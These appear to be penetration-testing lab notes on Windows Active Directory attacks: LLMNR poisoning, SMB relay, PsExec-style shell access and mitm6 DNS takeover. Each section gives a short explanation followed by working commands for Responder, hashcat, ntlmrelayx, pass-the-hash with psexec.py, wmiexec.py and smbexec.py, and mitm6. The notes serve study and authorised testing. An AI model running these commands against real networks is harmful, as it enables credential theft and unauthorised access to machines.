## LLMNR Poisoning

LLMNR (Link-Local Multicast Name Resolution) is a Windows protocol used to resolve hostnames when DNS fails. It allows devices to ask the local network, "Who has this hostname?"

How does poisoning work?

1. A Windows machine fails to resolve a hostname using DNS.
2. It broadcasts an LLMNR request to the local network, asking for the hostname’s IP.
3. An attacker intercepts the request and responds falsely, claiming to be the requested host.
4. The victim connects to the attacker's machine, often sending NTLMv2 hashed credentials in the process.
5. The attacker can capture the NTLM hash and attempt to crack it or use Pass-the-Hash attacks.

Run responder:

```bash
sudo responder -I tun0 -dwP
```

Crack NetNTLMv2 hash:
```bash
hashcat -m 5600 hashes.txt rockyou.txt
```

## SMB Relay

SMB (Server Message Block) is a protocol used for file sharing and authentication in Windows networks. It allows users to access shared files, printers, and network resources.

How does SMB Relay work?

1. A victim tries to connect to a malicious (or compromised) SMB server.
2. The attacker's server requests authentication and captures the victim’s NTLM hash.
3. Instead of cracking the hash, the attacker forwards (relays) it to another system on the network that accepts NTLM authentication.
4. If the relayed authentication is successful, the attacker gains access to the second system with the victim’s privileges.

Requirements:

- SMB Signing must be set to False or not required.
- Relayed user account needs to have admin privileges on the target machine.
- Responder.conf must have SMB=OFF and HTTP=OFF. `sudo mousepad /etc/responder/Responder.conf`

The attack can be done as follows:

- Check SMB signing:

```bash
nmap —script=smb2-security-mode.nse -p445 IP/CIDR
```

```bash
crackmapexec smb 192.168.100.0/24 --gen-relay-list relayOutFile.txt
```

- Run responder

```bash
sudo responder -I tun0 -dwP
```

- Run ntlmrelayx

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support [ -i for shell ] [ -c COMMAND ]
```

## PsExec Shell Access

- Metasploit:

`use exploit/windows/smb/psexec`

- Psexec.py:

```bash
psexec.py marvel.local/fcastle:’Password1’@IP_ADD
```

- Or with hash

```bash
psexec.py administrator@IP_ADDR -hashes HASH 
```

- Wmiexec.py:

```bash
wmiexec.py administrator@IP_ADDR -hashes HASH 
```

- Smbexec.py:

```bash
smbexec.py administrator@IP_ADDR -hashes HASH 
```

## MITM6 DNS takeover

MITM6 (Man-in-the-Middle IPv6) is a tool that exploits IPv6 auto-configuration in Windows networks to perform DNS takeover attacks.

How does the attack work?

1. Windows machines prefer IPv6 over IPv4 by default.
2. The attacker introduces a rogue IPv6 DHCP server using MITM6.
3. Victim machines automatically accept the attacker's fake IPv6 DNS server.
4. The attacker can now redirect DNS requests, forcing authentication to a malicious SMB/LDAP server.
5. If a victim authenticates, the attacker steals NTLM hashes and can perform relay attacks.

The attack can be done as follows:

- Run ntlmrelayx.py

```bash
ntlmrelayx.py -6 -t ldaps://DC_IP -wh fakewpad.marvel.local -l lootme
```

- Run mitm6

```bash
sudo mitm6 -d marvel.local
```
